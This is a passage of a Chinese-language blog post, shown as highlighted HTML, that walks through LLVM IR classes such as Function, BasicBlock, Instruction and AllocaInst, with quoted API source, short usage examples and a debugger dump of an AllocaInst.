class="hljs-title">getArg</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> i)</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span> (i &lt; NumArgs &amp;&amp; <span class="hljs-string">&quot;getArg() out of range!&quot;</span>);<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + i;<br>&#125;<br>    <br><span class="hljs-function">iterator_range&lt;arg_iterator&gt; <span class="hljs-title">args</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">arg_begin</span>(), <span class="hljs-built_in">arg_end</span>());<br>&#125;<br><span class="hljs-function">iterator_range&lt;const_arg_iterator&gt; <span class="hljs-title">args</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">arg_begin</span>(), <span class="hljs-built_in">arg_end</span>());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>创建一个Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;N, Module &amp;M)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">unsigned</span> AddrSpace, <span class="hljs-type">const</span> Twine &amp;N = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Module *M = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(Ty, Linkage, AddrSpace, N, M);<br>  &#125;<br><br><br><span class="hljs-function"><span class="hljs-type">static</span> Function *<span class="hljs-title">Create</span><span class="hljs-params">(FunctionType *Ty, LinkageTypes Linkage,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">const</span> Twine &amp;N = <span class="hljs-string">&quot;&quot;</span>, Module *M = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(Ty, Linkage, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(<span class="hljs-number">-1</span>), N, M);<br>  &#125;<br></code></pre></td></tr></table></figure><p>FunctionType的构造见上，getOrInsertFunction函数其实也是Create的封装</p></li><li><p>获取函数返回类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getFunctionType</span>()-&gt;<span class="hljs-built_in">getReturnType</span>(); &#125;<br></code></pre></td></tr></table></figure><p>FunctionType是Type的子类，ReturnType和ParamType都存在Type类型的ContainedTys成员里，这是一个Type数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span> &#123;<br><span class="hljs-keyword">protected</span>:<br>  <span class="hljs-type">unsigned</span> NumContainedTys = <span class="hljs-number">0</span>;<br>  Type * <span class="hljs-type">const</span> *ContainedTys = <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure><p>可以从getXXXType函数中看出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Function</span><br><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getFunctionType</span>()-&gt;<span class="hljs-built_in">getReturnType</span>(); &#125;<br><br><span class="hljs-comment">// FunctionType</span><br><span class="hljs-function">FunctionType *<span class="hljs-title">getFunctionType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">cast</span>&lt;FunctionType&gt;(<span class="hljs-built_in">getValueType</span>());<br>&#125;<br><span class="hljs-function">Type *<span class="hljs-title">getReturnType</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> ContainedTys[<span class="hljs-number">0</span>]; &#125;<br><span class="hljs-function">Type *<span class="hljs-title">getParamType</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> i)</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> ContainedTys[i+<span class="hljs-number">1</span>]; &#125;<br></code></pre></td></tr></table></figure></li><li><p>返回函数的入口BasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock       &amp;<span class="hljs-title">getEntryBlock</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>   </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">front</span>(); &#125;<br>      <span class="hljs-function">BasicBlock       &amp;<span class="hljs-title">getEntryBlock</span><span class="hljs-params">()</span>         </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">front</span>(); &#125;<br></code></pre></td></tr></table></figure></li><li><p>设置&amp;获取调用规则</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">CallingConv::ID <span class="hljs-title">getCallingConv</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;CallingConv::ID&gt;((<span class="hljs-built_in">getSubclassDataFromValue</span>() &gt;&gt; <span class="hljs-number">4</span>) &amp;<br>                                      CallingConv::MaxID);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setCallingConv</span><span class="hljs-params">(CallingConv::ID CC)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> ID = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(CC);<br>  <span class="hljs-built_in">assert</span>(!(ID &amp; ~CallingConv::MaxID) &amp;&amp; <span class="hljs-string">&quot;Unsupported calling convention&quot;</span>);<br>  <span class="hljs-built_in">setValueSubclassData</span>((<span class="hljs-built_in">getSubclassDataFromValue</span>() &amp; <span class="hljs-number">0xc00f</span>) | (ID &lt;&lt; <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰，不设置好像也没啥问题（</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *foo;<br>foo-&gt;<span class="hljs-built_in">setCallingConv</span>(CallingConv::C);<br></code></pre></td></tr></table></figure></li></ul><h1 id="BasicBlock"><a href="#BasicBlock" class="headerlink" title="BasicBlock"></a>BasicBlock</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/BasicBlock.png" class title="BasicBlock"><h2 id="相关操作-2"><a href="#相关操作-2" class="headerlink" title="相关操作"></a>相关操作</h2><ul><li><p>创建一个BasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> BasicBlock *<span class="hljs-title">Create</span><span class="hljs-params">(LLVMContext &amp;Context, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          Function *Parent = <span class="hljs-literal">nullptr</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          BasicBlock *InsertBefore = <span class="hljs-literal">nullptr</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">BasicBlock</span>(Context, Name, Parent, InsertBefore);<br>&#125;<br></code></pre></td></tr></table></figure><p>当InsertBefore为NULL时默认插入Function末尾</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BasicBlock::<span class="hljs-built_in">BasicBlock</span>(LLVMContext &amp;C, <span class="hljs-type">const</span> Twine &amp;Name, Function *NewParent,<br>                       BasicBlock *InsertBefore)<br>  : <span class="hljs-built_in">Value</span>(Type::<span class="hljs-built_in">getLabelTy</span>(C), Value::BasicBlockVal), <span class="hljs-built_in">Parent</span>(<span class="hljs-literal">nullptr</span>) &#123;<br><br>  <span class="hljs-keyword">if</span> (NewParent)<br>      <span class="hljs-comment">// Insert unlinked basic block into a function. Inserts an unlinked basic block into Parent. If InsertBefore is provided, inserts before that basic block, otherwise inserts at the end.</span><br>    <span class="hljs-built_in">insertInto</span>(NewParent, InsertBefore);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">assert</span>(!InsertBefore &amp;&amp;<br>           <span class="hljs-string">&quot;Cannot insert block before another block with no function!&quot;</span>);<br><br>  <span class="hljs-built_in">setName</span>(Name);<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *customFunc;<br>BasicBlock *entryBlock = BasicBlock::<span class="hljs-built_in">Create</span>(context, <span class="hljs-string">&quot;&quot;</span>, customFunc, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li><p>Instruction迭代器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//===--------------------------------------------------------------------===//</span><br><span class="hljs-comment">/// Instruction iterator methods</span><br><span class="hljs-comment">///</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">end</span>();   &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">end</span>();   &#125;<br>  <br><span class="hljs-function"><span class="hljs-keyword">inline</span> reverse_iterator        <span class="hljs-title">rbegin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rbegin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_reverse_iterator  <span class="hljs-title">rbegin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rbegin</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> reverse_iterator        <span class="hljs-title">rend</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rend</span>();   &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> const_reverse_iterator  <span class="hljs-title">rend</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">rend</span>();   &#125;<br>  <br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span>                   <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">size</span>();  &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">empty</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> Instruction      &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       Instruction      &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> Instruction       &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">back</span>();  &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       Instruction       &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> InstList.<span class="hljs-built_in">back</span>();  &#125;<br></code></pre></td></tr></table></figure></li><li><p>获取所属Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> Function *<span class="hljs-title">getParent</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br>      <span class="hljs-function">Function *<span class="hljs-title">getParent</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a>Instruction</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Instruction.png" class title="Instruction"><h2 id="相关操作-3"><a href="#相关操作-3" class="headerlink" title="相关操作"></a>相关操作</h2><ul><li><p>获取父BasicBlock</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> BasicBlock *<span class="hljs-title">getParent</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span>       BasicBlock *<span class="hljs-title">getParent</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> Parent; &#125;<br></code></pre></td></tr></table></figure></li><li><p>获取指令操作码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">getOpcode</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">getValueID</span>() - InstructionVal; &#125;<br></code></pre></td></tr></table></figure></li><li><p>返回指令的另一个实例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Instruction *<span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br></code></pre></td></tr></table></figure><p>但这个指令</p><ul><li>没有名字</li><li>没有Parent</li></ul></li><li><p>指令替换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReplaceInstWithInst</span><span class="hljs-params">(BasicBlock::InstListType &amp;BIL,</span></span><br><span class="hljs-params"><span class="hljs-function">                         BasicBlock::iterator &amp;BI, Instruction *I)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ReplaceInstWithInst</span><span class="hljs-params">(Instruction *From, Instruction *To)</span></span>;<span class="hljs-comment">// 不更新迭代器，会段错误</span><br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = bas.<span class="hljs-built_in">begin</span>(); it != bas.<span class="hljs-built_in">end</span>(); it++)&#123;<br>    ……<br><span class="hljs-built_in">ReplaceInstWithInst</span>(old_ope-&gt;<span class="hljs-built_in">getParent</span>()-&gt;<span class="hljs-built_in">getInstList</span>(), it, myaddCall);<br>    old_ope-&gt;<span class="hljs-built_in">replaceAllUsesWith</span>(myaddCall);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="不同Instruction的创建"><a href="#不同Instruction的创建" class="headerlink" title="不同Instruction的创建"></a>不同Instruction的创建</h1><p>只列出来了写作业的时候使用的</p><h2 id="alloca"><a href="#alloca" class="headerlink" title="alloca"></a>alloca</h2><p>alloca命令是AllocaInst类型，继承关系是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">AllocaInst-&gt;</span><span class="language-bash">UnaryInstruction-&gt;Instruction</span><br></code></pre></td></tr></table></figure><p>只比Instruction多了一个成员，表示储存数据的类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$<span class="hljs-number">2</span> = &#123;<br>  &lt;llvm::UnaryInstruction&gt; = &#123;<br>    &lt;llvm::Instruction&gt; = &#123;<br>      &lt;llvm::User&gt; = &#123;<br>        &lt;llvm::Value&gt; = &#123;<br>          VTy = <span class="hljs-number">0x46af60</span>,<br>          UseList = <span class="hljs-number">0x0</span>,<br>          SubclassID = <span class="hljs-number">57</span> <span class="hljs-string">&#x27;9&#x27;</span>,<br>          HasValueHandle = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassOptionalData = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>          SubclassData = <span class="hljs-number">2</span>,<br>          NumUserOperands = <span class="hljs-number">1</span>,<br>          IsUsedByMD = <span class="hljs-number">0</span>,<br>          HasName = <span class="hljs-number">0</span>,<br>          HasMetadata = <span class="hljs-number">0</span>,<br>          HasHungOffUses = <span class="hljs-number">0</span>,<br>          HasDescriptor = <span class="hljs-number">0</span>,<br>          <span class="hljs-type">static</span> MaxAlignmentExponent = <span class="hljs-number">29</span>,<br>          <span class="hljs-type">static</span> MaximumAlignment = <span class="hljs-number">536870912</span><br>        &#125;, &lt;No data fields&gt;&#125;, <br>      &lt;llvm::ilist_node_with_parent&lt;llvm::Instruction, llvm::BasicBlock&gt;&gt; = &#123;<br>        &lt;llvm::ilist_node&lt;llvm::Instruction&gt;&gt; = &#123;<br>          &lt;llvm::ilist_node_impl&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-type">void</span>&gt; &gt;&gt; = &#123;<br>            &lt;llvm::ilist_node_base&lt;<span class="hljs-literal">false</span>&gt;&gt; = &#123;<br>              Prev = <span class="hljs-number">0x46abd8</span>,<br>              Next = <span class="hljs-number">0x46abd8</span><br>            &#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, &lt;No data fields&gt;&#125;, <br>      members of llvm::Instruction:<br>      Parent = <span class="hljs-number">0x46abb0</span>,<br>      DbgLoc = &#123;<br>        Loc = &#123;<br>          Ref = &#123;<br>            MD = <span class="hljs-number">0x0</span><br>          &#125;<br>        &#125;<br>      &#125;,<br>      Order = <span class="hljs-number">0</span><br>    &#125;, &lt;No data fields&gt;&#125;, <br>  members of llvm::AllocaInst:<br>  AllocatedType = <span class="hljs-number">0x466d80</span><br>&#125;<br></code></pre></td></tr></table></figure><p>用new新建一个AllocaInst</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">AllocaInst</span><span class="hljs-params">(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize,</span></span><br><span class="hljs-params"><span class="hljs-function">                      <span class="hljs-type">const</span> Twine &amp;Name, Instruction *InsertBefore)</span></span>;<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br><br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, <span class="hljs-type">const</span> Twine &amp;Name,<br>             Instruction *InsertBefore);<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br><br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize, Align Align,<br>             <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>, Instruction *InsertBefore = <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">AllocaInst</span>(Type *Ty, <span class="hljs-type">unsigned</span> AddrSpace, Value *ArraySize, Align Align,<br>             <span class="hljs-type">const</span> Twine &amp;Name, BasicBlock *InsertAtEnd);<br></code></pre></td></tr></table></figure><ul><li><p>AddrSpace：可以通过Module获取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getDataLayout</span>().<span class="hljs-built_in">getAllocaAddrSpace</span>()<br></code></pre></td></tr></table></figure><ul><li><p>DataLayout就是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">target datalayout = <span class="hljs-string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>DataLayout有AllocaAddrSpace成员，getAllocaAddrSpace方法可以获取这个成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataLayout</span> &#123;<br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-type">unsigned</span> AllocaAddrSpace;<br>  <span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">getAllocaAddrSpace</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> AllocaAddrSpace; &#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>Name：形如以下语句的返回值名称</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">%<span class="hljs-number">1</span> = alloca i32, align <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure></li><li><p>BasicBlock：所属基本块</p></li><li><p>InsertBefore：新建的Instruction会插在InsertBefore之前</p></li><li><p>ArraySize：数组大小，可以通过新建一个ConstantInt实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> ConstantInt *<span class="hljs-title">get</span><span class="hljs-params">(LLVMContext &amp;Context, <span class="hljs-type">const</span> APInt &amp;V)</span></span>;<br></code></pre></td></tr></table></figure><p>APInt可以通过new新建</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">APInt</span>(<span class="hljs-type">uint64_t</span> *val, <span class="hljs-type">unsigned</span> bits) : <span class="hljs-built_in">BitWidth</span>(bits) &#123;<br>  U.pVal = val;<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Value* intValue = ConstantInt::<span class="hljs-built_in">get</span>(context, <span class="hljs-built_in">APInt</span>(<span class="hljs-number">32</span>, <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure></li><li><p>Align：可以通过Align创建</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Align</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> Value)</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span>(Value &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-string">&quot;Value must not be 0&quot;</span>);<br>  <span class="hljs-built_in">assert</span>(llvm::<span class="hljs-built_in">isPowerOf2_64</span>(Value) &amp;&amp; <span class="hljs-string">&quot;Alignment is not a power of 2&quot;</span>);<br>  ShiftValue = <span class="hljs-built_in">Log2_64</span>(Value);<br>  <span class="hljs-built_in">assert</span>(ShiftValue &lt; <span class="hljs-number">64</span> &amp;&amp; <span class="hljs-string">&quot;Broken 